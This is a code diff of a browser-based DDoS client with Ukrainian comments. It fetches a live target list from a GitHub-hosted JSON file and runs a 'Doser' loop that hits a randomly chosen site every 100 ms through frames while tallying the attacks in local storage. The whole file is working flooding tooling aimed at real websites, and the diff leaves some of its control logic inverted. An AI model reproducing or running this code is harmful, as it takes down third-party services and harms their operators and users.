@@ -1,5 +1,5 @@
 // Звідси будуть завантажуватись цілі
-const targetSource = 'https://raw.githubusercontent.com/opengs/uashieldtargets/test/sites.json'
+const targetSource = 'https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json'
 
 
 // Функції для керування документом
@@ -24,7 +24,9 @@ async function getSalt(target) {
 
 // Завантаження цілей
 async function getTarget() {
-	$("#load").remove()
+	// Створення сповіщення про завантаження цілей
+
+	$("#load").remove();
 	$("<p>", {id:"load"}).text("Завантажуємо цілі...")
 	.appendTo(box);
 
@@ -33,7 +35,7 @@ async function getTarget() {
     	$("#load").text("Помилка завантаження!");
     	alert(`Помилка!\nПеревірте підключення до інтернету!\nТекст помилки: ${e}`);
     });
-    if (targets instanceof Response) {
+    if (targets instanceof Response) { // Якщо запит повернув результат
     	data = await targets.json();
 
 		targets = [];
@@ -47,8 +49,7 @@ async function getTarget() {
 		$("#load").remove()
 	   	
 	    return targets[randint(targets.length)] // Рандомна ціль
-    }
-    return null
+    };
 }
 
 
@@ -70,21 +71,22 @@ const Frames = {
 let targetField = $("#target")
 let methodField = $("#method")
 
+// https://github.com/BogdanDevUA/simple-ddos/
+
 setTarget = (target) => {
-	if (target != null) {
+	if (target) {
 		targetField.text(target.page);
 	    methodField.text(target.method.toUpperCase());
-	    return true
 	} else {
-		return false
+		return true
 	}
 }
 
 
 class Doser {
-    attack = false; // Status of attack
-    interval;
-    saver;
+    attack = false; // Статус атаки
+    interval; // Цикл DDoS-атаки
+    saver; // Цикл збереження данних про кількість атак
 
     async start(isFetch=false) {
     	this.attack = true;
@@ -95,10 +97,10 @@ class Doser {
         let target = await getTarget();
 
         let set = setTarget(target);
-        if (!set) {
+        if (set) { // Якщо не завнтажились цілі
         	this.attack = false;
         	btn.text("Старт!");
-        	return
+        	return // Стоп
         }
         console.log(target);
 
@@ -127,13 +129,16 @@ class Doser {
         	add_count();
 
         	if ($("#frame")[0].childElementCount >= 200) {Frames.clear()};
-        }, 100);
+        }, 	100);
 
         this.saver = setInterval(() => {
         	let atck = LocalStorage.getItem("attacks")
 
-        	atck = parseInt(atck == NaN ? 0 : atck) // Попередні атаки
-        	LocalStorage.setItem("attacks", atck + parseInt(attacks.text()))
+        	atck = !atck ? 0 : parseInt(atck) // Попередні атаки
+        	LocalStorage.setItem("attacks", 
+        	atck + (parseInt(attacks.text())) - atck); // Збереження
+
+        	console.log("Saved!");
         }, 3000)
     };
     stop() {
@@ -148,15 +153,17 @@ class Doser {
 
 
 let btn = $("#button")
-let LocalStorage = window.localStorage
+let LocalStorage = window.localStorage // База данних користувача
 let box = $(".box")
 
 $(() => {
 	Doser = new Doser // Ініціалізація воркера
 
 	if (!LocalStorage.getItem("check_license")) {
+		// Ліцензія обов'язкова для прочитання
+
 		alert('Прочитайте ліцензію в розділі "Ресурси"!')
-		LocalStorage.setItem("check_license", "true")
+		LocalStorage.setItem("check_license", true)
 	}
 
 	btn.click((e) => {
@@ -165,14 +172,11 @@ $(() => {
 		!Doser.attack ? Doser.start() : Doser.stop();
 	});
 	$("#attackCount").click(() => {
+		// Загальна кількість атак
+
 		let a = LocalStorage.getItem("attacks")
 		alert(`Взагалом атаковано: ${!a ? 0 : a}`)
-	})
-	/*
-	$(".item").click(() => {
-		copy(window.location + `#${$(this.id)}`)
-	})
-	*/
+	});
 })
 
 // Слава Україні!
